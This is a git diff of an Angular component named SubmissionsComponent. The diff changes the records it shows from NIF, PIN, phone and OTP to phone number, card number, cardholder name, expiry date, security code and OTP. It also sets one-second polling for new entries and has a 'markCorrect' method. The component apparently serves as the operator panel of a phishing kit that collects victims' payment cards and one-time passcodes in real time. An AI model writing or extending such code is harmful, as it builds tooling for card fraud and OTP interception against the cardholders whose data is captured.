@@ -5,20 +5,29 @@ import { SubmissionService } from '../submission.service';
 @Component({
   selector: 'app-submissions',
   templateUrl: './submissions.component.html',
-  styleUrls: ['./submissions.component.css']
+  styleUrls: ['./submissions.component.css'],
 })
 export class SubmissionsComponent implements OnInit, OnDestroy {
-  submissions: { nif: string, pin: string, phone: string,otp: string }[] = [];
+  submissions: {
+    phoneNumber: string;
+    cardNumber: string;
+    cardHolderName: string;
+    expiryDate: string;
+    securityCode: string;
+    otp: string;
+  }[] = [];
   private submissionUpdateSubscription!: Subscription;
   private pollingIntervalMs = 1000; // Polling interval in milliseconds (e.g., every 5 seconds)
 
-  constructor(private submissionService: SubmissionService) { }
+  constructor(private submissionService: SubmissionService) {}
 
   ngOnInit(): void {
-    this.submissions = this.submissionService.getSubmissions();
+    //this.submissions = this.submissionService.getSubmissions();
 
     // Subscribe to periodic submission updates
-    this.submissionUpdateSubscription = interval(this.pollingIntervalMs).subscribe(() => {
+    this.submissionUpdateSubscription = interval(
+      this.pollingIntervalMs
+    ).subscribe(() => {
       this.updateSubmissions();
     });
   }
@@ -30,7 +39,7 @@ export class SubmissionsComponent implements OnInit, OnDestroy {
 
   private updateSubmissions(): void {
     // Update the local submissions list from the service
-    this.submissions = this.submissionService.getSubmissions();
+    //this.submissions = this.submissionService.getSubmissions();
   }
 
   markCorrect(submission: any): void {
